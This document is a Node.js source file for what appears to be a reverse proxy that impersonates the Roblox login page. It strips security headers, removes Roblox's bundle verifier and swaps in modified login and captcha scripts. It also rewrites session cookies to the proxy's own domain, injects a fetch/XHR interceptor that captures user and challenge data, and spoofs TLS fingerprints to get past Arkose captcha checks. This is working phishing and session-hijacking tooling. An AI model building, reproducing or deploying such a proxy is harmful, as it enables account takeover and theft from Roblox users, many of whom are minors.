// JSON parsing in game_core_bootstrap.js.  Fall back to {} when that happens.
app.use('/fc/init-load', async (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);
    const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
    const targetUrl = `https://arkoselabs.roblox.com/fc/init-load/${qs}`;
    const headers = {
        'Origin': 'https://www.roblox.com',
        'Referer': 'https://www.roblox.com/login',
        'User-Agent': req.headers['user-agent'] || BROWSER_UA,
        'Accept': 'application/json, text/plain, */*',
    };
    if (req.headers['cookie']) headers['Cookie'] = req.headers['cookie'];
    try {
        const result = await makeCurlRequest(req.method, targetUrl, headers, null, false);
        const bodyStr = result.body ? result.body.toString().trim() : '';
        if (!bodyStr || bodyStr.length === 0) {
            console.log('[fc/init-load] Empty response from Arkose — returning fallback {}');
            res.set('Content-Type', 'application/json');
            res.status(200).send('{}');
        } else {
            res.set('Content-Type', result.headers['content-type'] || 'application/json');
            res.status(result.statusCode).send(bodyStr);
        }
    } catch (e) {
        console.error('[fc/init-load] Error:', e.message);
        res.set('Content-Type', 'application/json');
        res.status(200).send('{}');
    }
});

// /pows/setup — proxy to arkoselabs.roblox.com without any URL rewriting.
// The PoW iframe and its assets now load directly from arkoselabs.roblox.com.
app.get('/pows/setup', async (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    const proxyOrigin = origin.startsWith('https://') ? origin : `https://${req.headers.host}`;
    setCors(res, origin);

    const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
    const targetUrl = `https://arkoselabs.roblox.com/pows/setup${qs}`;

    try {
        const result = await makeCurlRequest('GET', targetUrl, {
            'Origin':  'https://www.roblox.com',
            'Referer': 'https://www.roblox.com/login',
            'User-Agent': req.headers['user-agent'] || BROWSER_UA,
            'Accept': 'application/json, */*',
        }, null, false);

        let body = result.body.toString();
        // NOTE: Domain rewrite disabled - arkose pow setup loads directly from arkoselabs.roblox.com
        // body = body.replace(/https:\/\/arkoselabs\.roblox\.com/g, proxyOrigin);

        console.log(`[pows/setup] Serving pow setup directly from arkoselabs.roblox.com`);
        res.setHeader('Content-Type', 'application/json; charset=utf-8');
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.status(result.statusCode).send(body);
    } catch (err) {
        console.error(`[pows/setup] Error: ${err.message}`);
        res.status(502).json({ error: 'pows/setup proxy error' });
    }
});

// /pows/ - Proof of Work endpoints (all other pows routes)
app.use('/pows', createCurlProxy('arkoselabs.roblox.com', '/pows', false));

// /powseq/ - PoW sequence endpoint (dynamic compat JS files)
app.use('/powseq', createCurlProxy('arkoselabs.roblox.com', '/powseq', false));

// /params/ - Parameters endpoint
app.use('/params', createCurlProxy('arkoselabs.roblox.com', '/params', false));

// /rtig/ - Real-time image generation
app.use('/rtig', createCurlProxy('arkoselabs.roblox.com', '/rtig', false));

// /cdn/fc/assets/pow/ - PoW challenge UI: Route removed to allow direct loading from arkoselabs.roblox.com
// The pow assets now load directly without being intercepted or modified

// /cdn/fc/ - CDN assets for FunCaptcha (generic fallback)
app.use('/cdn/fc', createCurlProxy('arkoselabs.roblox.com', '/cdn/fc', false));

app.use('/cdn/fc/assets', createCurlProxy('arkoselabs.roblox.com', '/cdn/fc/assets', false));

// /game/report-stats - PoW telemetry stub (blocked by CSP otherwise)
app.get('/game/report-stats', (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.status(200).send('');
});

// /game/report-event/ - Game report event endpoint (Arkose)
app.use('/game/report-event', createCurlProxy('arkoselabs.roblox.com', '/game/report-event', false));

// /assets/ec-game-core/ - Game core bootstrap assets for captcha (REQUIRED for captcha to load)
app.use('/assets/ec-game-core', createCurlProxy('arkoselabs.roblox.com', '/assets/ec-game-core', false));

// /public_key/ - Public key endpoint for captcha (REQUIRED for captcha initialization)
app.use('/public_key', createCurlProxy('arkoselabs.roblox.com', '/public_key', false));

// Existing /fc/gt2 route
app.use('/fc/gt2', createCurlProxy('arkoselabs.roblox.com', '/fc/gt2', false));

// Other /fc routes
for (const route of ['/fc', '/pows', '/rtig', '/params', '/cdn']) {
    app.use(route, createCurlProxy('arkoselabs.roblox.com', route, false));
}

// ─────────────────────────────────────────────────────────────
// CAPTCHA METADATA STUB
// ─────────────────────────────────────────────────────────────
app.use('/captcha/v1/metadata', (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);
    res.status(200).json({
        funCaptchaPublicKeys: {
            ACTION_TYPE_WEB_LOGIN:  '476068BF-9607-4799-B53D-966BE98E2B81',
            ACTION_TYPE_WEB_SIGNUP: 'A2A14B1D-1AF3-C901-9988-80100049E0C0',
            ACTION_TYPE_WEB_ROBOT:  '0A34A698-7C62-4C8C-8DFB-14B0DC4BA3A3',
        },
        fc_nosuppress: '0'
    });
});

// ─────────────────────────────────────────────────────────────
// ARKOSE SETTINGS STUB
// ─────────────────────────────────────────────────────────────
app.use('/v2/:publicKey/settings.json', (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);
    res.status(200).json({});
});

// ─────────────────────────────────────────────────────────────
// ARKOSE LABS API.JS - SERVE LOCAL FILES
// ─────────────────────────────────────────────────────────────
app.get('/v2/api.js', (req, res) => {
    res.setHeader('Content-Type', 'application/javascript');
    res.sendFile(path.join(__dirname, 'modified-js', 'api-loader.js'));
});

app.get('/v2//api.js', (req, res) => {
    res.setHeader('Content-Type', 'application/javascript');
    res.sendFile(path.join(__dirname, 'modified-js', 'api-loader.js'));
});

app.get(/^\/v2\/[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12}\/api\.js$/i, (req, res) => {
    res.setHeader('Content-Type', 'application/javascript');
    res.sendFile(path.join(__dirname, 'modified-js', 'api-core.js'));
});

// ═════════════════════════════════════════════════════════════════════════════
// ═══ LOCAL ARKOSE ENFORCEMENT FILES - NO EXTERNAL FETCHING ═══════════════════
// ═════════════════════════════════════════════════════════════════════════════
// Serve local enforcement.html and enforcement.js from modified-js/ folder
// for ANY version/hash combination. The version/hash in the URL is ignored.
// ═════════════════════════════════════════════════════════════════════════════

// Pattern: /v2/{version}/enforcement.{hash}.html (e.g., /v2/4.0.15/enforcement.xxx.html)
app.get(/^\/v2\/\d+\.\d+\.\d+\/enforcement\.[a-f0-9]+\.html$/i, (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);
    
    console.log(`[enforcement] HTML request: ${req.path} → serving local modified-js/enforcement.html`);
    
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Cache-Control', 'public, max-age=3600');
    res.sendFile(path.join(__dirname, 'modified-js', 'enforcement.b68ab7a7f261051e8c53cfe808ea9418.html'), (err) => {
        if (err) {
            console.error(`[enforcement] Error serving HTML: ${err.message}`);
            res.status(500).json({ error: 'Enforcement HTML not found in modified-js/' });
        }
    });
});

// Pattern: /{version}/enforcement.{hash}.html (without /v2 prefix)
app.get(/^\/\d+\.\d+\.\d+\/enforcement\.[a-f0-9]+\.html$/i, (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);
    
    console.log(`[enforcement] HTML request (no /v2): ${req.path} → serving local modified-js/enforcement.html`);
    
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Cache-Control', 'public, max-age=3600');
    res.sendFile(path.join(__dirname, 'modified-js', 'enforcement.b68ab7a7f261051e8c53cfe808ea9418.html'), (err) => {
        if (err) {
            console.error(`[enforcement] Error serving HTML: ${err.message}`);
            res.status(500).json({ error: 'Enforcement HTML not found in modified-js/' });
        }
    });
});

// Pattern: /v2/{version}/enforcement.{hash}.js (e.g., /v2/4.0.15/enforcement.xxx.js)
app.get(/^\/v2\/\d+\.\d+\.\d+\/enforcement\.[a-f0-9]+\.js$/i, (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);
    
    console.log(`[enforcement] JS request: ${req.path} → serving local modified-js/enforcement.js`);
    
    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    res.setHeader('Cache-Control', 'public, max-age=3600');
    res.sendFile(path.join(__dirname, 'modified-js', 'enforcement.b68ab7a7f261051e8c53cfe808ea9418.js'), (err) => {
        if (err) {
            console.error(`[enforcement] Error serving JS: ${err.message}`);
            res.status(500).json({ error: 'Enforcement JS not found in modified-js/' });
        }
    });
});

// Pattern: /{version}/enforcement.{hash}.js (without /v2 prefix)
app.get(/^\/\d+\.\d+\.\d+\/enforcement\.[a-f0-9]+\.js$/i, (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);
    
    console.log(`[enforcement] JS request (no /v2): ${req.path} → serving local modified-js/enforcement.js`);
    
    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    res.setHeader('Cache-Control', 'public, max-age=3600');
    res.sendFile(path.join(__dirname, 'modified-js', 'enforcement.b68ab7a7f261051e8c53cfe808ea9418.js'), (err) => {
        if (err) {
            console.error(`[enforcement] Error serving JS: ${err.message}`);
            res.status(500).json({ error: 'Enforcement JS not found in modified-js/' });
        }
    });
});

// ─────────────────────────────────────────────────────────────
// ARKOSE LABS CAPTCHA /v2/ ENDPOINTS
// ─────────────────────────────────────────────────────────────
app.use('/v2', async (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);

    const pathParts = req.path.split('/').filter(p => p.length > 0);
    
    // ═══════════════════════════════════════════════════════════
    // ═══ SAFETY CHECK: Serve enforcement files from modified-js/ ═══
    // If enforcement requests reach here, serve from local modified-js/
    // ═══════════════════════════════════════════════════════════
    if (pathParts.length >= 2 && 
        /^\d+\.\d+\.\d+$/.test(pathParts[0]) && 
        pathParts[1].startsWith('enforcement.')) {
        
        const filename = pathParts[1];
        
        if (filename.endsWith('.html')) {
            console.log(`[captcha] ⚠️ Enforcement HTML reached /v2 handler: ${req.path}`);
            res.setHeader('Content-Type', 'text/html; charset=utf-8');
            return res.sendFile(path.join(__dirname, 'modified-js', 'enforcement.b68ab7a7f261051e8c53cfe808ea9418.html'), (err) => {
                if (err) {
                    console.error(`[captcha] Error serving enforcement HTML: ${err.message}`);
                    res.status(500).json({ error: 'Enforcement HTML not found in modified-js/' });
                }
            });
        }
        
        if (filename.endsWith('.js')) {
            console.log(`[captcha] ⚠️ Enforcement JS reached /v2 handler: ${req.path}`);
            res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
            return res.sendFile(path.join(__dirname, 'modified-js', 'enforcement.b68ab7a7f261051e8c53cfe808ea9418.js'), (err) => {
                if (err) {
                    console.error(`[captcha] Error serving enforcement JS: ${err.message}`);
                    res.status(500).json({ error: 'Enforcement JS not found in modified-js/' });
                }
            });
        }
    }

    let targetPath = '/' + pathParts.join('/');
    let targetHost = ROBLOX_CAPTCHA_HOST;

    if (pathParts.length === 0) {
        console.log('[captcha] Empty /v2/ path, ignoring');
        return res.status(400).json({ error: 'Invalid path' });
    } else if (pathParts.length === 1 && pathParts[0] === 'api.js') {
        console.log(`[captcha] api.js no UUID -> should have been handled by local route`);
        return res.status(404).json({ error: 'api.js not found' });
    } else if (ARKOSE_PUBLIC_KEY_PATTERN.test(pathParts[0])) {
        const filename = pathParts[pathParts.length - 1] || '';
        if (filename === 'api.js') {
            console.log(`[captcha] api.js -> should have been handled by local route`);
            return res.status(404).json({ error: 'api.js not found' });

         } else if (/^enforcement\.[a-f0-9]+\.html$/i.test(filename)) {
            res.setHeader('Content-Type', 'text/html; charset=utf-8');
            return res.sendFile(path.join(__dirname, 'modified-js', 'enforcement.b68ab7a7f261051e8c53cfe808ea9418.html'), (err) => {
        if (err) res.status(500).json({ error: 'Enforcement HTML not found' });
    });
         } else if (/^enforcement\.[a-f0-9]+\.js$/i.test(filename)) {
            res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
            return res.sendFile(path.join(__dirname, 'modified-js', 'enforcement.b68ab7a7f261051e8c53cfe808ea9418.js'), (err) => {
        if (err) res.status(500).json({ error: 'Enforcement JS not found' });
    });
   
        } else {
            targetHost = 'arkoselabs.roblox.com';
            targetPath = '/v2' + targetPath;
            console.log(`[captcha] ${filename} -> arkoselabs.roblox.com${targetPath}`);
        }
    } else if (pathParts[0] === 'funcaptcha' || pathParts[0] === 'challenge') {
        console.log(`[captcha] Funcaptcha/challenge: ${req.path}`);
    } else {
        targetHost = 'arkoselabs.roblox.com';
        console.log(`[captcha] Unknown /v2/ -> arkoselabs.roblox.com: ${req.path}`);
    }

    const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
    const targetUrl = `https://${targetHost}${targetPath}${qs}`;

    console.log(`[captcha] ${req.method} ${req.path} → ${targetUrl}`);

    const headers = {
        'Origin':          'https://www.roblox.com',
        'Referer':         'https://www.roblox.com/login',
        'User-Agent':      req.headers['user-agent'] || BROWSER_UA,
        'Accept':          req.headers['accept'] || '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
    };

    if (req.headers['content-type']) {
        headers['Content-Type'] = req.headers['content-type'];
    }
    if (req.headers['cookie']) {
        headers['Cookie'] = req.headers['cookie'];
    }
    if (req.headers['x-csrf-token']) {
        headers['X-CSRF-Token'] = req.headers['x-csrf-token'];
    }
    if (req.headers['rbx-device-id']) {
        headers['rbx-device-id'] = req.headers['rbx-device-id'];
    }

    for (const h of CHALLENGE_HEADERS) {
        if (req.headers[h]) headers[h] = req.headers[h];
    }

    let body = null;
    if (['POST', 'PUT', 'PATCH'].includes(req.method.toUpperCase())) {
        body = await new Promise((resolve) => {
            const bufs = [];
            req.on('data', c => bufs.push(c));
            req.on('end', () => resolve(Buffer.concat(bufs)));
        });
    }

    try {
        const isApiJs = targetUrl.includes('api.js');
        const result = await makeCurlRequest(
            req.method,
            targetUrl,
            headers,
            body,
            false
        );

        console.log(`[captcha] ← ${result.statusCode}`);

        const skipHdrs = new Set([
            'content-security-policy', 'content-security-policy-report-only',
            'x-content-security-policy', 'transfer-encoding', 'connection',
            'content-encoding', 'keep-alive', 'proxy-authenticate',
            'proxy-authorization', 'te', 'trailers', 'upgrade'
        ]);

        for (const [k, v] of Object.entries(result.headers)) {
            if (skipHdrs.has(k)) continue;
            if (k === 'set-cookie') {
                res.set('Set-Cookie', rewriteCookies([].concat(v), getCleanHost(req)));
            } else {
                try { res.set(k, v); } catch (_) {}
            }
        }

        if (req.path.endsWith('.js') && !result.headers['content-type']) {
            res.set('Content-Type', 'application/javascript; charset=utf-8');
        }

        res.status(result.statusCode).send(result.body);

    } catch (err) {
        console.error(`[captcha] ❌ ${req.method} ${req.path} | ${err.message}`);
        if (!res.headersSent) {
            res.status(502).json({ error: 'Captcha proxy error', message: err.message });
        }
    }
});

// ─────────────────────────────────────────────────────────────
// FUNCAPTCHA DIRECT PATHS
// ─────────────────────────────────────────────────────────────
app.use('/funcaptcha', async (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);

    let targetPath = req.path.replace(/\/+/g, '/');
    if (!targetPath.startsWith('/')) targetPath = '/' + targetPath;

    const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
    const targetUrl = `https://${ROBLOX_CAPTCHA_HOST}/funcaptcha${targetPath}${qs}`;

    console.log(`[funcaptcha] ${req.method} ${req.path} → ${targetUrl}`);

    const headers = {
        'Origin':          'https://www.roblox.com',
        'Referer':         'https://www.roblox.com/login',
        'User-Agent':      req.headers['user-agent'] || BROWSER_UA,
        'Accept':          req.headers['accept'] || '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
    };

    if (req.headers['cookie']) headers['Cookie'] = req.headers['cookie'];
    if (req.headers['content-type']) headers['Content-Type'] = req.headers['content-type'];

    let body = null;
    if (['POST', 'PUT', 'PATCH'].includes(req.method.toUpperCase())) {
        body = await new Promise((resolve) => {
            const bufs = [];
            req.on('data', c => bufs.push(c));
            req.on('end', () => resolve(Buffer.concat(bufs)));
        });
    }

    try {
        const result = await makeCurlRequest(req.method, targetUrl, headers, body, false);
        console.log(`[funcaptcha] ← ${result.statusCode}`);

        for (const [k, v] of Object.entries(result.headers)) {
            if (k === 'set-cookie') {
                res.set('Set-Cookie', rewriteCookies([].concat(v), getCleanHost(req)));
            } else {
                try { res.set(k, v); } catch (_) {}
            }
        }
        res.status(result.statusCode).send(result.body);
    } catch (err) {
        console.error(`[funcaptcha] ❌ ${err.message}`);
        if (!res.headersSent) res.status(502).json({ error: 'Funcaptcha proxy error', message: err.message });
    }
});

// ─────────────────────────────────────────────────────────────
// MODIFIED JS FILES — serve from modified-js/ at /js/ paths
// These must be before the main Roblox proxy so our versions win.
// ─────────────────────────────────────────────────────────────
function serveModifiedJs(filename) {
    return (req, res) => {
        const origin = req.headers['origin'] || `https://${req.headers.host}`;
        setCors(res, origin);
        res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
        res.setHeader('Cache-Control', 'no-store');
        console.log(`[modified-js] ${req.path} → modified-js/${filename}`);
        res.sendFile(path.join(__dirname, 'modified-js', filename), (err) => {
            if (err) {
                console.error(`[modified-js] Error serving ${filename}: ${err.message}`);
                res.status(500).end();
            }
        });
    };
}

app.get(/^\/js\/enforcement\.[a-f0-9]+\.js$/i,  serveModifiedJs('enforcement.b68ab7a7f261051e8c53cfe808ea9418.js'));
app.get('/js/Challenge.js',       serveModifiedJs('Challenge.js'));
app.get('/js/ReactLogin.js',      serveModifiedJs('ReactLogin.js'));
app.get('/js/CoreUtilities.js',   serveModifiedJs('CoreUtilities.js'));
app.get('/js/EnvironmentUrls.js', serveModifiedJs('EnvironmentUrls.js'));

// ─────────────────────────────────────────────────────────────
// INJECTED SCRIPT
// ─────────────────────────────────────────────────────────────
const INJECTED_SCRIPT = `<script>
(function() {
    window.__rblxChallengeInfo = {};
    
    var _fetch = window.fetch;
    window.fetch = function(resource, init) {
        init = init || {};
        init.credentials = 'include';
        return _fetch.call(this, resource, init).then(function(response) {
            var challengeId       = response.headers.get('rblx-challenge-id');
            var challengeType     = response.headers.get('rblx-challenge-type');
            var challengeMetadata = response.headers.get('rblx-challenge-metadata');
            if (challengeId) {
                window.__rblxChallengeId   = challengeId;
                window.__rblxChallengeType = challengeType;
                window.__rblxChallengeInfo = {
                    id: challengeId,
                    type: challengeType,
                    metadata: challengeMetadata,
                    timestamp: Date.now()
                };
                console.log('[Proxy] Challenge detected:', window.__rblxChallengeInfo);
                if (challengeMetadata) {
                    try {
                        var meta = JSON.parse(atob(challengeMetadata));
                        window.__rblxUserId           = meta.userId;
                        window.__rblxBrowserTrackerId = meta.browserTrackerId;
                        window.__rblxChallengeMetadata = meta;
                    } catch(e) {
                        console.log('[Proxy] Failed to parse challenge metadata:', e);
                    }
                }
            }
            return response;
        });
    };
    var _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        this.__url = url;
        return _open.apply(this, arguments);
    };
    var _send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function() {
        this.withCredentials = true;
        return _send.apply(this, arguments);
    };
    console.log('[Proxy] Interceptor loaded');
})();
</script>`;

// ─────────────────────────────────────────────────────────────
// MAIN PAGE HANDLER
// ─────────────────────────────────────────────────────────────
app.use('/', createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    secure: true,
    selfHandleResponse: true,
    proxyTimeout: 30000,
    timeout: 30000,
    agent: httpsAgent,

    pathRewrite: (reqPath) => (reqPath === '/' ? '/login' : reqPath),

    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('user-agent',      req.headers['user-agent'] || BROWSER_UA);
            proxyReq.setHeader('accept',          'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
            proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
            proxyReq.setHeader('accept-encoding', 'identity');
        },
        
        proxyRes: responseInterceptor(async (buffer, proxyRes, req, res) => {
            const host   = req.headers.host || 'localhost';
            const origin = req.headers['origin'] || `https://${host}`;

            delete proxyRes.headers['content-security-policy'];
            delete proxyRes.headers['content-security-policy-report-only'];
            delete proxyRes.headers['x-content-security-policy'];

            if (proxyRes.headers['set-cookie']) {
                proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], getCleanHost(req));
                console.log(`[main] 🍪 Rewrote ${proxyRes.headers['set-cookie'].length} cookies → .${host.replace(/^www\./, '')}`);
            }

            res.setHeader('access-control-allow-origin',      origin);
            res.setHeader('access-control-allow-credentials', 'true');

            const ct = proxyRes.headers['content-type'] || '';
            if (!ct.includes('text/html')) return buffer;

            let body = buffer.toString('utf8');

            body = body.replace(/<script[^>]*>\s*var Roblox\s*=\s*Roblox[^<]*BundleVerifierConstants[\s\S]*?<\/script>/gi, '');
            body = body.replace(/<script[^>]*bundleVerifier\.js[^>]*><\/script>/gi, '');

            console.log('[main] 🚫 bundleVerifier removed');

            body = body.replace(
                /https?:\/\/[^"']*\/[a-f0-9]+-EnvironmentUrls\.js[^"']*/g,
                `/js/EnvironmentUrls.js`
            );
            body = body.replace(
                /https?:\/\/[^"']*\/[a-f0-9]+-CoreUtilities\.js[^"']*/g,
                `/js/CoreUtilities.js`
            );
            body = body.replace(
                /https?:\/\/[^"']*\/[a-f0-9]+-Challenge\.js[^"']*/g,
                `/js/Challenge.js`
            );
            body = body.replace(
                /https?:\/\/[^"']*\/[a-f0-9]+-ReactLogin\.js[^"']*/g,
                `/js/ReactLogin.js?v=1`
            );

            const metaTags = generateProxyMetaTags();
            body = body.replace('<head', `<head>${metaTags}${INJECTED_SCRIPT}`);

            return body;
        }),

        error: (err, req, res) => {
            console.error(`[main] ❌ ${req.method} ${req.path} | ${err.code}: ${err.message}`);
            if (!res.headersSent) res.status(502).send('Proxy error');
        }
    }
}));

// ─────────────────────────────────────────────────────────────
// START
// ─────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 8080; // defaults to 8080
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Proxy running on port ${PORT}`);
    console.log(`📁 Modified JS from: ${path.join(__dirname, 'modified-js')}`);
    console.log(`📋 ${API_ROUTES.length} API routes | ${ARKOSE_ROUTES.length} Arkose routes`);
    console.log(`🧩 Captcha routes: /v2/* → captcha.roblox.com | /funcaptcha/* → captcha.roblox.com`);
    console.log(`🔒 ALL requests now use curl-impersonate for TLS fingerprint spoofing`);
    console.log(`✅ FIXED: Added /fc/a/, /fc/ca/, /fc/gfct/, /pows/, /params/, /rtig/ routes`);
    console.log(`✅ FIXED: Added /assets/ec-game-core/, /public_key/, /cdn/fc/assets/, /game/report-event/ routes`);
    console.log(`✅ FIXED: Enforcement HTML handler now matches /v2/ prefix`);
});
